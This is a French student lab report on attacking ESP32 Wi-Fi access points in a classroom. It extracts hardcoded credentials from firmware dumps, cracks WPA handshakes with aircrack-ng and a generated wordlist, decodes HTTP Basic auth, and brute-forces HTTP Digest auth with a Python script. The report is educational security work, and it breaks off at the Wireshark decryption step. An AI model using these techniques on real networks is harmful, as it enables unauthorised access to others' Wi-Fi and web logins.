---
author:
- Nicolas Vadkerti
title: SECO TP 1
---

<https://github.com/SlaynPool/CR_SECO/>

Attaques hors ligne
===================

AP HTTP
-------

On recupere le fichier .ino disponible sur moodle, on modifie les
parametres de l'application comme ceci:

-   ``` {#code/AP_HTTPHead.ino .c++ caption="Modification du .ino" label="code/AP_HTTPHead.ino" style="Style1"}
    code$ head -n15 AP_HTTP.ino 
    #include <WiFi.h>
    #include <WebServer.h>
    #define CHANNEL 5
    const char *ssid="NicolasV";
    const char *pass="87654321";
    const char *www_realm="Authentification ESP32";
    const char *www_username="Toto";
    const char *www_password="Totoro";
    IPAddress ip(192,168,42,1);
    IPAddress gateway(192,168,42,254);
    IPAddress subnet(255,255,255,0);
    WebServer server(80);

    void wifiAPSetup() {
      Serial.println("wifiAPSetup...");
    ................
    ```

![Premier Page[]{label="fig:net "}](image/1.jpg){#fig:net }

![Connection []{label="fig:net "}](image/2.jpg){#fig:net }

![Reussite []{label="fig:net "}](image/3.jpg){#fig:net }

Fouille du .bin de mon voisin
-----------------------------

Voici la ligne de compilation executer par l'IDE:\

-   ``` {#code/compil.txt .default caption="compilation" label="code/compil.txt" style="Style1"}
    python /home/slaynpool/.arduino15/packages/esp32/tools/esptool_py/2.6.1/esptool.py --chip esp32 elf2image --flash_mode dio --flash_freq 80m --flash_size 4MB -o /tmp/arduino_build_64730/AP_HTTP.ino.bin /tmp/arduino_build_64730/AP_HTTP.ino.elf
    ```

Le fichier .bin est generer dans tmp arduino build 64730 Buddy ma fourni
son binaire qui tourne sur son ESP. Grace à Hexdump nous avons converti
le binnaire en caractère lisible:

-   ``` {#code/hexcom.txt .default caption="traduction" label="code/hexcom.txt" style="Style1"}
    code$ hexdump -C AP_HTTP-Buddy.ino.bin  --length 200
    00000000  e9 06 02 2f b0 1e 08 40  ee 00 00 00 00 00 00 00  |.../...@........|
    00000010  00 00 00 00 00 00 00 01  20 00 40 3f 7c 65 02 00  |........ .@?|e..|
    00000020  c6 95 0d 40 42 95 0d 40  a0 95 0d 40 c6 95 0d 40  |...@B..@...@...@|
    00000030  e9 95 0d 40 0c 96 0d 40  0c 96 0d 40 0c 96 0d 40  |...@...@...@...@|
    00000040  0c 96 0d 40 66 95 0d 40  b2 95 0d 40 c6 95 0d 40  |...@f..@...@...@|
    00000050  e9 95 0d 40 5d 9e 0d 40  da 9d 0d 40 38 9e 0d 40  |...@]..@...@8..@|
    00000060  5d 9e 0d 40 81 9e 0d 40  a4 9e 0d 40 a4 9e 0d 40  |]..@...@...@...@|
    00000070  a4 9e 0d 40 a4 9e 0d 40  fe 9d 0d 40 49 9e 0d 40  |...@...@...@I..@|
    00000080  5d 9e 0d 40 81 9e 0d 40  00 00 00 00 00 00 00 80  |]..@...@........|
    00000090  00 00 00 a0 00 00 00 c0  00 00 00 e0 14 14 14 07  |................|
    000000a0  07 82 06 75 05 68 04 4e  03 34 02 27 01 1a 00 0d  |...u.h.N.4.'....|
    000000b0  02 04 0b 16 03 00 00 00  01 00 00 00 00 00 00 00  |................|
    000000c0  20 00 00 00 02 03 01 00                           | .......|
    000000c8
    code$ hexdump -C AP_HTTP-Buddy.ino.bin |grep SSID
    00001110  3a 20 25 73 0d 0a 00 42  53 53 49 44 3a 20 25 73  |: %s...BSSID: %s|



    ```

On voit que quand je cherche le mot SSID, il me repond que ce mots
existe à la ligne 00001110. Nous regardons donc a cette ligne pour voir
si il ya pas des mots de passes à proximité de la déclaration du SSID et
:

-   ``` {#code/result.hex caption="On a trouvé !" label="code/result.hex" style="Style1"}
    00001110  3a 20 25 73 0d 0a 00 42  53 53 49 44 3a 20 25 73  |: %s...BSSID: %s|
    00001120  0d 0a 00 57 45 42 20 73  65 72 76 65 72 20 73 65  |...WEB server se|
    00001130  74 75 70 2e 2e 2e 00 2f  6c 6f 67 69 6e 00 57 45  |tup..../login.WE|
    00001140  42 20 73 65 72 76 65 72  20 72 75 6e 6e 69 6e 67  |B server running|
    00001150  2e 2e 2e 00 53 65 74 75  70 20 64 6f 6e 65 2e 00  |....Setup done..|
    00001160  39 38 37 36 35 34 33 32  00 62 75 64 64 79 00 41  |98765432.buddy.A|
    00001170  75 74 68 65 6e 74 69 66  69 63 61 74 69 6f 6e 20  |uthentification |
    00001180  45 53 50 33 32 00 32 33  34 35 36 37 38 39 00 63  |ESP32.23456789.c|
    00001190  65 73 74 71 75 6f 69 6c  65 63 6f 64 65 00 25 30  |estquoilecode.%0|
    000011a0  32 58 3a 25 30 32 58 3a  25 30 32 58 3a 25 30 32  |2X:%02X:%02X:%02|
    000011b0  58 3a 25 30 32 58 3a 25  30 32 58 00 00 00 00 00  |X:%02X:%02X.....|
    000011c0  00 00 00 00 7c 1b 0d 40  98 1b 0d 40 0c 45 14 40  |....|..@...@.E.@|
    ```

On comprend rapidement que le premier mots de passes que l'on semble
voir est le mots de passes de l'authentification WEB, notament car
"buddy" n'est pas le SSID que je vois depuis ma carte Wifi mais plutot
"cestquoilecode" Donc on déduis grâce au binaire que on pourra passer
l'authentification Web grâce au couple User/PWD : buddy/98765432\
Et le Mot de passe du reseau Wifi : 23456789

Dump d'un binaire depuis une carte
----------------------------------

J'ai echangé mon ESP32 avec Buddy. Je m'attend donc à obtenir le même
resultat que précedement.\
Pour dumper la memoire d'un ESP32, nous allons utiliser la commande
suivante :

-   ``` {#code/dump.txt .default caption="Dump de la memoire flash d'un ESP" label="code/dump.txt" style="Style1"}
    [slaynpool@MiniZbeub]code$ esptool.py read_flash 0x11110 300 AP_HTTP1_dump300.bin
    esptool.py v2.8
    Found 2 serial ports
    Serial port /dev/ttyUSB0
    Connecting....
    Detecting chip type... ESP32
    Chip is ESP32D0WDQ5 (revision 1)
    Features: WiFi, BT, Dual Core, Coding Scheme None
    Crystal is 40MHz
    MAC: 24:0a:c4:1d:2b:38
    Uploading stub...
    Running stub...
    Stub running...
    300 (100 %)
    300 (100 %)
    Read 300 bytes at 0x11110 in 0.0 seconds (63.6 kbit/s)...
    Hard resetting via RTS pin...
    [slaynpool@MiniZbeub]code$ hexdump -C AP_HTTP1_dump300.bin 
    00000000  3a 20 25 73 0d 0a 00 42  53 53 49 44 3a 20 25 73  |: %s...BSSID: %s|
    00000010  0d 0a 00 57 45 42 20 73  65 72 76 65 72 20 73 65  |...WEB server se|
    00000020  74 75 70 2e 2e 2e 00 2f  6c 6f 67 69 6e 00 57 45  |tup..../login.WE|
    00000030  42 20 73 65 72 76 65 72  20 72 75 6e 6e 69 6e 67  |B server running|
    00000040  2e 2e 2e 00 53 65 74 75  70 20 64 6f 6e 65 2e 00  |....Setup done..|
    00000050  39 38 37 36 35 34 33 32  00 62 75 64 64 79 00 41  |98765432.buddy.A|
    00000060  75 74 68 65 6e 74 69 66  69 63 61 74 69 6f 6e 20  |uthentification |
    00000070  45 53 50 33 32 00 32 33  34 35 36 37 38 39 00 63  |ESP32.23456789.c|
    00000080  65 73 74 71 75 6f 69 6c  65 63 6f 64 65 00 25 30  |estquoilecode.%0|
    00000090  32 58 3a 25 30 32 58 3a  25 30 32 58 3a 25 30 32  |2X:%02X:%02X:%02|
    000000a0  58 3a 25 30 32 58 3a 25  30 32 58 00 00 00 00 00  |X:%02X:%02X.....|
    000000b0  00 00 00 00 7c 1b 0d 40  98 1b 0d 40 0c 45 14 40  |....|..@...@.E.@|
    000000c0  bc 19 0d 40 54 17 0d 40  24 45 14 40 00 18 0d 40  |...@T..@$E.@...@|
    000000d0  90 1a 0d 40 38 7b 0d 40  c8 44 14 40 5c 7b 0d 40  |...@8{.@.D.@\{.@|
    000000e0  74 16 0d 40 f4 44 14 40  1c 19 0d 40 3c 1b 0d 40  |t..@.D.@...@<..@|
    000000f0  e0 1a 0d 40 dc 44 14 40  7c 1c 0d 40 c8 16 0d 40  |...@.D.@|..@...@|
    00000100  7c 19 0d 40 00 00 00 00  00 00 00 00 4c 45 14 40  ||..@........LE.@|
    00000110  98 16 0d 40 18 17 0d 40  a4 16 0d 40 5c 45 14 40  |...@...@...@\E.@|
    00000120  00 00 00 00 00 00 00 00  44 45 14 40              |........DE.@|
    0000012c
    ```

On determine L'OFFSET grace à cette ligne vu dans l'arduino IDE:

-   ``` {#code/onsaitladdresse.txt .default caption="Compilation" label="code/onsaitladdresse.txt" style="Style1"}
    python /home/slaynpool/.arduino15/packages/esp32/tools/esptool_py/2.6.1/esptool.py --chip esp32 --port /dev/ttyUSB0 --baud 921600 --before default_reset --after hard_reset write_flash -z --flash_mode dio --flash_freq 80m --flash_size detect 0xe000 /home/slaynpool/.arduino15/packages/esp32/hardware/esp32/1.0.4/tools/partitions/boot_app0.bin 0x1000 /home/slaynpool/.arduino15/packages/esp32/hardware/esp32/1.0.4/tools/sdk/bin/bootloader_qio_80m.bin 0x10000 /tmp/arduino_build_64730/AP_HTTP.ino.bin 0x8000 /tmp/arduino_build_64730/AP_HTTP.ino.partitions.bin 
    ```

Le binaire sera donc ecrit à partir de l'adresse 0x10000 donc on regarde
directement à l'adresse 0x10000+0x1110 soit 0x11110

Remise à Zero de la memoire flash de L'ESP32
--------------------------------------------

Pour cela il suffit d'utiliser la commande suivante:

-   ``` {#code/erase.txt .default caption="esptool.py erase flash" label="code/erase.txt" style="Style1"}
    ~$ esptool.py erase_flash 
    esptool.py v2.8
    Found 2 serial ports
    Serial port /dev/ttyUSB0
    Connecting....
    Detecting chip type... ESP32
    Chip is ESP32D0WDQ5 (revision 1)
    Features: WiFi, BT, Dual Core, Coding Scheme None
    Crystal is 40MHz
    MAC: 24:0a:c4:1d:46:94
    Uploading stub...
    Running stub...
    Stub running...
    Erasing flash (this may take a while)...
    Chip erase completed successfully in 3.9s
    Hard resetting via RTS pin...
    [slaynpool@MiniZbeub]~$ esptool.py read_flash  0x0 400000 AP_HTTP1_dump300.bin
    esptool.py v2.8
    Found 2 serial ports
    Serial port /dev/ttyUSB1
    Connecting....
    Detecting chip type... ESP32
    Chip is ESP32D0WDQ5 (revision 1)
    Features: WiFi, BT, Dual Core, Coding Scheme None
    Crystal is 40MHz
    MAC: 24:0a:c4:1d:46:94
    Uploading stub...
    Running stub...
    Stub running...
    400000 (100 %)
    400000 (100 %)
    Read 400000 bytes at 0x0 in 36.1 seconds (88.5 kbit/s)...
    Hard resetting via RTS pin...
    [slaynpool@MiniZbeub]~$ hexdump -C AP_HTTP1_dump300.bin 
    00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
    *
    00061a80
    ```

On voit que la commande a correctement fonctionner car quand nous lisons
la memoire de la carte, nous n'avons que des "ff"

L'historique des anciens programmes restes sur L'ESP32
------------------------------------------------------

En Effet, si on compile/téléverse le programes plusieurs fois sur la
carte, tous en modifiant le mots de passe de l'AP par exemple( 87654321,
17654321, 27654321), on se rend compte que les anciens MDP sont encore
visibles:

-   ``` {#code/oldpPwd.txt .default caption="On voit les anciens PWD" label="code/oldpPwd.txt" style="Style1"}
    code$ esptool.py read_flash 0x0 400000 AP_HTTP1_dump300.bin 
    esptool.py v2.8
    Found 2 serial ports
    Serial port /dev/ttyUSB0
    Connecting......
    Detecting chip type... ESP32
    Chip is ESP32D0WDQ5 (revision 1)
    Features: WiFi, BT, Dual Core, Coding Scheme None
    Crystal is 40MHz
    MAC: 24:0a:c4:1d:46:94
    Uploading stub...
    Running stub...
    Stub running...
    400000 (100 %)
    400000 (100 %)
    Read 400000 bytes at 0x0 in 36.0 seconds (88.8 kbit/s)...
    Hard resetting via RTS pin...
    [slaynpool@MiniZbeub]code$ hexdump -C AP_HTTP1_dump300.bin |grep 7654321
    0000a540  38 37 36 35 34 33 32 31  00 00 00 00 00 00 00 00  |87654321........|
    0000a8e0  31 37 36 35 34 33 32 31  00 00 00 00 00 00 00 00  |17654321........|
    0000ac80  32 37 36 35 34 33 32 31  00 00 00 00 00 00 00 00  |27654321........|
    00011180  33 32 00 32 37 36 35 34  33 32 31 00 4e 69 63 6f  |32.27654321.Nico|
    ```

On peut donc voir que le Premier MDP est stocké à l'adresse 0x0a540\
Le second MDP est stocké à l'adresse 0x0a8e0\
Le mots de passe actuelle est stocké à l'adresse 0x0ac80 et l'ancienne
adresse 0x011180

Attaques en fonctionnement à distance
=====================================

Creation d'un dictionnaire
--------------------------

On veut créer un dictonnaire contenant chaques mdp avec que des
chiffres, sans doublons:

-   ``` {#code/genDico/genDico.py .python caption="Mon générateur de dictionnaire" label="code/genDico/genDico.py" style="Style1"}
    def gen():
        dico = open("dico.txt", "w")
        #dico.write("")
        for a in range(0,10):
            for z in range(0,10):
                if z != a:
                    for e in range(0,10):
                        if e !=a and e!=z:
                            for r in range(0,10):
                                if r!=a and r!=z and r!=e:
                                    for t in range(0,10):
                                        if t!=a and t!=z and t!=e and t!=r:
                                            for y in range(0,10):
                                                if y!=a and y!=z and y!=e and y!=r and y!=t:
                                                    for u in range(0,10):
                                                        if u!=a and u!=z and u!=e and u!=r and u!=t and u!=y:
                                                            for i in range(0,10):
                                                                if i!=a and i!=z and i!=e and i!=r and i!=t and i!=y and i!=u:
                                                                    dico.write(str(a)+str(z)+str(e)+str(r)+str(t)+str(y)+str(u)+str(i)+"\n")
        dico.close()
    gen()

    ```

Le dictionnaire généré semble etre de la taille que vous nous avez
indiquez et semble générer les bons nombres

-   ``` {#code/genDico/taille.txt .default caption="Mon dictionnaire" label="code/genDico/taille.txt" style="Style1"}
    genDico$ sl
    total 16M
    drwxr-xr-x 2 slaynpool slaynpool 4,0K janv. 29 15:10 .
    drwxr-xr-x 4 slaynpool slaynpool 4,0K janv. 29 14:58 ..
    -rw-r--r-- 1 slaynpool slaynpool  16M janv. 29 15:38 dico.txt
    -rw-r--r-- 1 slaynpool slaynpool 1,2K janv. 29 15:38 genDico.py
    [slaynpool@MiniZbeub]genDico$ head dico.txt
    01234567
    01234568
    01234569
    01234576
    01234578
    01234579
    01234586
    01234587
    01234589
    01234596
    ```

Utilisation de aircrack-ng sur le fichier ap1.pcap
--------------------------------------------------

On utilise aircrack-ng comme ceci :

-   ``` {#code/aircrack.txt .default caption="aircrack" label="code/aircrack.txt" style="Style1"}
    [slaynpool@MiniZbeub]manip$ aircrack-ng -w dico.txt -b 24:0a:c4:11:03:11 ap1.pcap 
    Reading packets, please wait...
    Opening ap1.pcap
    Read 707 packets.
    1 potential targets
                             Aircrack-ng 1.6 rev e708c21e

          [00:01:55] 1018600/1814400 keys tested (8948.72 k/s) 

          Time left: 1 minute, 28 seconds                           56.14%

                               KEY FOUND! [ 54921037 ]


          Master Key     : A0 95 76 12 96 52 BD 1A 28 B3 65 97 81 8F F8 D7 
                           8A CB 87 74 93 ED F5 92 B1 C8 E9 5A 99 D5 D4 98 

          Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

          EAPOL HMAC     : 09 3F 16 D3 78 C3 11 A6 E0 A1 5D 6B B2 B8 45 15 
    ```

Nous avons donc reussi à obtenir la clé de l'AP et celle-ci est
"54921037" !!!!

Décodage de trame http
----------------------

Nous avons trouvé la clé du reseau précedament, il faut donc que
WireShark la connaisse pour pouvoir déchiffré les trames:

![Ajoute de la Clé dans
wireshark[]{label="fig:net "}](image/5.jpg){#fig:net }

A partir de là, nous somme donc capable d'interpréter les trames et donc
les trames http : On choisis une trame GET/login:

![Ajoute de la Clé dans
wireshark[]{label="fig:net "}](image/4.jpg){#fig:net }

\
Donc on sait que c'est du base64\

-   ``` {#code/base64.txt .default caption="Decodage du base 64" label="code/base64.txt" style="Style1"}
    [slaynpool@MiniZbeub]~$ echo  YWRtaW46NjIwODUxOTQ=|base64 -d 
    admin:62085194
    ```

Le couple USER/PWD est admin/62085194

Realisation de la manip sur la puce de mon voisin
-------------------------------------------------

Tout d'abord, on veut savoir quelle channel utilise notre voisin. Son
reseau s'appelle "cestquoilecode".

-   ``` {#code/ChannelWant caption="Determination de la bande de son voisin" label="code/ChannelWant" style="Style1"}
    [slaynpool@MiniZbeub]code$ sudo iw wlp1s0 scan |grep cestquoi -B 10 -A 10
    		 * VO: CW 3-7, AIFSN 2, TXOP 1504 usec
    BSS 24:0a:c4:1d:2b:39(on wlp1s0)
    	last seen: 1766.146s [boottime]
    	TSF: 72585078 usec (0d, 00:01:12)
    	freq: 2432
    	beacon interval: 100 TUs
    	capability: ESS Privacy ShortPreamble ShortSlotTime (0x0431)
    	signal: -34.00 dBm
    	last seen: 590 ms ago
    	Information elements from Probe Response frame:
    	SSID: cestquoilecode
    	Supported rates: 5.5* 11.0* 1.0* 2.0* 6.0 12.0 24.0 48.0 
    	Extended supported rates: 54.0 9.0 18.0 36.0 
    	DS Parameter set: channel 5   <----------------
    	Country: CN	Environment: bogus
    		Channels [1 - 13] @ 20 dBm
    	RSN:	 * Version: 1
    		 * Group cipher: TKIP
    		 * Pairwise ciphers: CCMP TKIP
    		 * Authentication suites: PSK
    		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
    ```

On configure donc notre carte sur le chanel 5 et on passe en mode
monitor.

-   ``` {#code/confWifi caption="Configuration de la carte wifi" label="code/confWifi" style="Style1"}
    [slaynpool@MiniZbeub]code$ sudo ifconfig wlp1s0 down 
    [slaynpool@MiniZbeub]code$ sudo iwconfig wlp1s0 mode monitor
    [slaynpool@MiniZbeub]code$ sudo ifconfig wlp1s0 up 
    [slaynpool@MiniZbeub]code$ sudo iw wlp1s0 set channel 5
    [slaynpool@MiniZbeub]code$ sudo iw wlp1s0 info
    Interface wlp1s0
    	ifindex 2
    	wdev 0x1
    	addr 52:94:ce:54:40:2d
    	type monitor
    	wiphy 0
    	channel 5 (2432 MHz), width: 20 MHz (no HT), center1: 2432 MHz
    	txpower 17.00 dBm
    ```

J'ai donc fais une capture de trame en demandant à Buddy de se connecter
à l'AP, pour qu'il génére le HandShake et qu'il soit visibles dans ma
capture. Le problème à etait que je n'ai pas vu le handshake complet.
J'ai donc changé de carte Wifi et fais et bien récupérer le HandShake,
lancé AirCrack-ng et Bingo :

-   ``` {#code/manipBuddy caption="On à reussi" label="code/manipBuddy" style="Style1"}
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 down 
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iwconfig wlp0s20f0u1u1u2 mode monitor
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 up
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iw wlp0s20f0u1u1u2 set channel 5 HT40+
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# exit
    exit
    [slaynpool@MiniZbeub]manip$ aircrack-ng -w dico.txt vendredi.pcap 
    Reading packets, please wait...
    Opening vendredi.pcap
    Read 4019 packets.

       #  BSSID              ESSID                     Encryption

       1  00:3A:9A:20:E8:20                            Unknown
       2  00:3A:9A:20:E8:23                            Unknown
       3  00:3A:9A:20:E8:25  eduroam                   Unknown
       4  00:3A:9A:20:E8:26                            Unknown
       5  00:3A:9A:24:58:E0                            Unknown
       6  00:3A:9A:24:58:E3                            Unknown
       7  24:0A:C4:1D:1A:59  xxxxxxxx                  Unknown
       8  24:0A:C4:1D:1C:25  MonitorME                 Unknown
       9  24:0A:C4:1D:1D:89  TPSECOC                   Unknown
      10  24:0A:C4:1D:2B:39  cestquoilecode            WPA (1 handshake)

    Index number of target network ? 10

    Reading packets, please wait...
    Opening vendredi.pcap
    Read 4019 packets.

    1 potential targets



                             Aircrack-ng 1.6 rev e708c21e

          [00:00:25] 221032/1814400 keys tested (8838.02 k/s) 

          Time left: 3 minutes, 0 seconds                           12.18%

                               KEY FOUND! [ 13456789 ]


          Master Key     : 58 16 83 73 96 C7 C9 87 F6 1B 01 43 7B C7 D8 66 
                           CC DD 45 07 76 C9 DD 91 81 3E FF 87 EE EE 6F 75 

          Transient Key  : D8 E4 42 04 60 18 D4 99 68 33 D0 7B 9F 68 E3 1C 
                           E5 5D 71 92 E1 E9 7D 7D 06 F6 3E 00 00 00 00 00 
                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

          EAPOL HMAC     : C7 FF 55 33 0D 2A 83 28 D2 F6 52 BF C3 3C 86 D7 
    ```

On indique donc maintenant à Wireshark la clé pour qu'il puisse
décrypter les trames. NOTE IMPORTANTE: Pour pouvoir décrypter les trames
HTTP, on doit avoir l'intergalité de la connection, CàD, le HandShake,
et les trames HTTP.

![On a trouvé l'identification
HTTP[]{label="fig:net "}](image/6.jpg){#fig:net }

Verification de la validité d'un couple USER/PWD
------------------------------------------------

En ce basant sur le cours et la page Wikipedia fourni, voici mon
"programe":

-   ``` {#manip/digest_auth.sh .bash caption="Digest Auth" label="manip/digest_auth.sh" style="Style1"}
    #!/bin/bash
    #Authorization: Digest
    username="toto"
    mdp="torototo"
    realm="ESP32 Auth Realm"
    nonce="cc9cbac018c0129883d1c524b7af17a1"
    uri="/login"
    cnonce="ZTFmZTNjZWNkNzdhNGUxODU5MTE1NTI1MGFjN2E2OTE="
    nc=00000001
    qop="auth"
    response="6baf6d27497be36eb2a1da31361ac4f7"
    opaque="a3613940abb23155185997325e98bb73"

    Hash1=$(echo -n $username":"$realm":"$mdp|md5sum|cut -d" " -f1)
    Hash2=$(echo -n "GET:"$uri|md5sum|cut -d" " -f1)
    result=$(echo -n $Hash1":"$nonce":"$nc":"$cnonce":"$qop":"$Hash2|md5sum|cut -d" " -f1)
    #echo -n $Hash1":"$nonce":"$nc":"$cnonce":"$qop":"$Hash2
    if [ "$response" = "$result" ] 
    then
        echo "Right Login/PASSWORD"
    else
        echo "Bad Login/PASSWORD"
    fi

    #echo $result
    ```

Détérmination du mots de passe de l'utilisateur dans le fichier ap2.pcap
------------------------------------------------------------------------

Tous d'abord, on doit trouver le mots de passes de l'AP :

-   ``` {#code/manipAP2I caption="71862093" label="code/manipAP2I" style="Style1"}
    [slaynpool@MiniZbeub]manip$ aircrack-ng -w dico.txt ap2.pcap 
    Reading packets, please wait...
    Opening ap2.pcap
    Read 947 packets.

       #  BSSID              ESSID                     Encryption

       1  00:07:CB:02:BE:00  freebox_102030            Unknown
       2  00:07:CB:02:BE:01  FreeWifi                  Unknown
       3  00:07:CB:02:BE:02  FreeWifi_secure           Unknown
       4  24:0A:C4:11:03:11  HackMe                    WPA (1 handshake)
       5  A8:A7:95:AE:62:AB  DIRECT-AB-HP BU           Unknown

    Index number of target network ? 4

    Reading packets, please wait...
    Opening ap2.pcap
    Read 947 packets.

    1 potential targets



                             Aircrack-ng 1.6 rev e708c21e

          [00:02:38] 1287872/1814400 keys tested (8276.71 k/s) 

          Time left: 1 minute, 3 seconds                            70.98%

                               KEY FOUND! [ 71862093 ]


          Master Key     : 66 04 EC 8D FB 55 CC 19 68 6C 73 53 4B 58 29 28 
                           C4 49 E1 72 8B 22 FC 31 FD 01 13 00 95 0F 1A AB 

          Transient Key  : 63 1D 76 5F E3 68 6A 22 E4 23 46 08 BD 4A 2C 33 
                           48 15 32 B8 A0 E8 A6 6F FD 60 3C 00 00 00 00 00 
                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                           00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

          EAPOL HMAC     : A2 CA 6F 69 CB D9 86 80 E3 EC 64 01 D1 47 71 12 
    ```

On peut ainsi récuperer les informations de connactions dans la trame de
connection:

![Ajoute de la Clé dans
wireshark[]{label="fig:net "}](image/7.jpg){#fig:net }

Nous avons donc toutes les informations pour brute Force le mot de
passe. Nous allons utiliser le meme code qui vérifier la validité du mot
de passe réecrie en Python pour des raisons de rapidités:

-   ``` {#manip/digest_authAP2.py .python caption="digest authentification python" label="manip/digest_authAP2.py" style="Style1"}
    import hashlib
    username="alice"
    realm="ESP32 Auth Realm"
    nonce="f71c1a0ee32fe388c45caf821405f2be"
    uri="/login"
    cnonce="ZmIxYjU2ZmZjMzYyZWM2NzhkYThhOTAzYjI2N2NlMGE="
    nc="00000001"
    qop="auth"
    response="8c806a5a42f69c674ccbaa7e8de87b4a"
    opaque="0eccb6e4b80a9ea569a5a5b5984dc185"


    with open('dico.txt', 'r') as mon_dico:
        for line in mon_dico:
            mdp = str(line)[:-1]
            hash1 = username+":"+realm+":"+mdp
            hash11 = hashlib.md5(hash1.encode())
            hash111 = hash11.hexdigest()
            #--------#
            hash2 = "GET:"+uri
            hash22 = hashlib.md5(hash2.encode())
            hash222 = hash22.hexdigest()
            #--------#
            hash3 = hash111+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+hash222
            hash33 = hashlib.md5(hash3.encode())
            hash333= hash33.hexdigest()
            #print(" result :"+hash333)
            #--------#
            if hash333==response:
                print("Right Login/Password : "+mdp)
                break
     #       else:
    #            print("||||"+mdp+"|||||")






    ```

Reproduction sur une vrai puce en fonctionnement
------------------------------------------------

Donc on determine le channel de la puce et on configure notre carte wifi
en mode monitor sur le bon channel:

-   ``` {#code/puce/1 caption="Setup" label="code/puce/1" style="Style1"}
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 down 
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iwconfig wlp0s20f0u1u1u2 mode managed
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 up 
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iw wlp0s20f0u1u1u2 scan |grep cbIDO2 -B 10 -A 15
    		 * VI: CW 7-15, AIFSN 2, TXOP 3008 usec
    		 * VO: CW 3-7, AIFSN 2, TXOP 1504 usec
    BSS 5e:cf:7f:1b:74:2f(on wlp0s20f0u1u1u2)
    	TSF: 13731867829 usec (0d, 03:48:51)
    	freq: 2422
    	beacon interval: 100 TUs
    	capability: ESS Privacy (0x0011)
    	signal: -45.00 dBm
    	last seen: 760 ms ago
    	Information elements from Probe Response frame:
    	SSID: cbIDO2
    	Supported rates: 5.5* 11.0* 1.0* 2.0* 6.0 12.0 24.0 48.0 
    	DS Parameter set: channel 3
    	Country: CN	Environment: bogus
    		Channels [1 - 13] @ 20 dBm
    	Extended supported rates: 54.0 9.0 18.0 36.0 
    	RSN:	 * Version: 1
    		 * Group cipher: TKIP
    		 * Pairwise ciphers: CCMP TKIP
    		 * Authentication suites: PSK
    		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
    BSS 24:0a:c4:1d:3a:d9(on wlp0s20f0u1u1u2)
    	TSF: 3423258760 usec (0d, 00:57:03)
    	freq: 2457
    	beacon interval: 100 TUs
    	capability: ESS Privacy ShortPreamble ShortSlotTime (0x0431)
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 down 
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iwconfig wlp0s20f0u1u1u2 mode monitor
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# ifconfig wlp0s20f0u1u1u2 up 
    [root@MiniZbeub]/home/slaynpool/Documents/IDO/SECO/manip# iw wlp0s20f0u1u1u2 set channel 3
    ```

On fait une capture de trame pendant une connexion à l'AP et au site
sécuriser, au moins nous n'aurons pas à refaire de capture de trame:

![Capture[]{label="fig:net "}](image/8.jpg){#fig:net }

On utilise AirCrack-ng:

-   ``` {#code/puce/2 caption="AirCrack" label="code/puce/2" style="Style1"}
    [slaynpool@MiniZbeub]puce$ aircrack-ng -w ../dico.txt Cpt.pcap 
    Reading packets, please wait...
    Opening Cpt.pcap
    Read 1774 packets.
       #  BSSID              ESSID                     Encryption

       1  00:3A:99:2B:1D:40                            Unknown
       2  00:3A:9A:24:58:E0                            Unknown
       3  00:3A:9A:24:58:E3  IUTBEZIERS                Unknown
       4  00:3A:9A:24:58:E5  eduroam                   Unknown
       5  00:3A:9A:24:58:E6                            Unknown
       6  00:3A:9A:F4:2C:D0                            Unknown
       7  24:0A:C4:1D:1A:59  xxxxxxxx                  Unknown
       8  24:0A:C4:1D:2B:39  cestquoilecode            WPA (0 handshake)
       9  24:0A:C4:1D:37:4D  floflo                    Unknown
      10  24:0A:C4:1D:3A:D9  habibi                    WPA (0 handshake)
      11  24:0A:C4:1D:46:51  Skrr                      Unknown
      12  24:0A:C4:1D:49:A5  Cookie                    Unknown
      13  24:0A:C4:1D:4B:E1  Durel                     Unknown
      14  5E:CF:7F:1B:74:2F  cbIDO2                    WPA (1 handshake)
      15  D2:53:DA:05:04:28                            WEP (1 IVs)
    Index number of target network ? 14
    Reading packets, please wait...
    Opening Cpt.pcap
    Read 1774 packets.
    1 potential targets
                             Aircrack-ng 1.6 rev e708c21e

          [00:02:14] 1092856/1814400 keys tested (8301.35 k/s) 

          Time left: 1 minute, 26 seconds                           60.23%

                               KEY FOUND! [ 61495327 ]


          Master Key     : D0 A2 CB DF CB 06 20 13 EC BC F1 41 74 E5 61 C7 
                           45 CE 3A 9A 69 7A EC 1C DB 40 B5 78 A0 82 FB F9 

          Transient Key  : 45 D5 4A AB 74 51 2F 77 B3 31 F6 5B A4 B6 1B AF 
                           D8 D4 1F 41 54 AF B4 BB DF 0F 65 A5 C7 ED 04 B7 
                           CB CB CE BA 80 8A C9 34 AE FA 74 58 A3 A4 67 03 
                           3B 48 88 CE 92 31 C3 0A D8 5E 7C 10 05 0E DE DA 

          EAPOL HMAC     : D6 E0 B8 41 AC 91 0F 52 0E 0A EC 81 A4 C5 EB E6 
    ```

On décrypte les trames avec wireshark :

